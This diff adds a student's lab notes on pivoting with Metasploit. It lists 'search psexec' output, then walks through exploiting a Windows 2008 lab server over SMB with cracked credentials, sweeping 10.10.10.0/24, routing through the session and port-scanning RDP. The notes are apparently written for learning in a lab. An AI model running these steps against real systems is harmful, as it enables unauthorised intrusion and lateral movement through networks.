@@ -1,0 +1,67 @@
+In the name of god 
+In this senario we want to learn piovoting and how to do it with 
+metasploit , first before everything we have to exploit the win2008 server 
+like before but this time we want to exploit from smb protocol
+we turn on the msfconsole and the search psexec 
+
+msf > search psexec
+
+Matching Modules
+================
+
+   #   Full Name                                    Disclosure Date  Rank       Check  Name
+   -   ---------                                    ---------------  ----       -----  ----
+   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
+   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
+   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
+   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
+   4     \_ target: Automatic                       .                .          .      .
+   5     \_ target: PowerShell                      .                .          .      .
+   6     \_ target: Native upload                   .                .          .      .
+   7     \_ target: MOF upload                      .                .          .      .
+   8     \_ target: Command                         .                .          .      .
+   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   10    \_ target: Automatic                       .                .          .      .
+   11    \_ target: PowerShell                      .                .          .      .
+   12    \_ target: Native upload                   .                .          .      .
+   13    \_ target: MOF upload                      .                .          .      .
+   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
+   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
+   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
+   17    \_ AKA: ETERNALBLUE                        .                .          .      .
+   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
+   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
+   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
+   22    \_ AKA: ETERNALBLUE                        .                .          .      .
+   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
+   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
+   25    \_ target: Automatic                       .                .          .      .
+   26    \_ target: PowerShell                      .                .          .      .
+   27    \_ target: Native upload                   .                .          .      .
+   28    \_ target: MOF upload                      .                .          .      .
+   29    \_ target: Command                         .                .          .      .
+   30  exploit/windows/local/ntlm_relay_2_self      2001-01-01       normal     No     NTLM Relay to Self (HTTP to LDAP) - Post Exploitation
+   31  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   32  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
+   33  encoder/x86/service                          .                manual     No     Register Service
+   34  post/windows/manage/smb_to_meterpreter       .                normal     Yes    SMB to Meterpreter Upgrade via PsExec
+   35  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
+   36  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
+   37    \_ target: Automatic                       .                .          .      .
+   38    \_ target: Native upload                   .                .          .      .
+   39  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
+
+since we want to use psexec we have to use 24,we 'use 24' and then the configiurations
+like 1 and 2.lin however this time there's a little diffrane,since we cracked the 
+password and the username from before,we have to set smbPASS and smbUSER vagrant
+and after opening a session , for identifying the other endpoints we have to Ctrl+z for putting our session in background and then
+we have to use 'use post/multi/gather/ping_sweep' with this command from the smb pc all avaible networks will be identified , 
+also we should set RHOST 10.10.10.0/24  and set sesion 8 and then run -j , after this we will see avaible endpoints,
+now if we want to scan specific port in the network with using the win2008 server we have to make it act as a router
+we use 'route add 10.10.10.1/32 1' this means that from now on if u want to reach 10.10.10.1 you have to go through session 1
+
+for scaning the specific port we use command 'use auxiliary/scanner/portscan/tcp'
+and we 'set RPORT 3389' 'set RHOST 10.10.10.1' AND then run -j 
+
+Everything is done and we scanned port 3389 through session 1 and we know if its open or no  
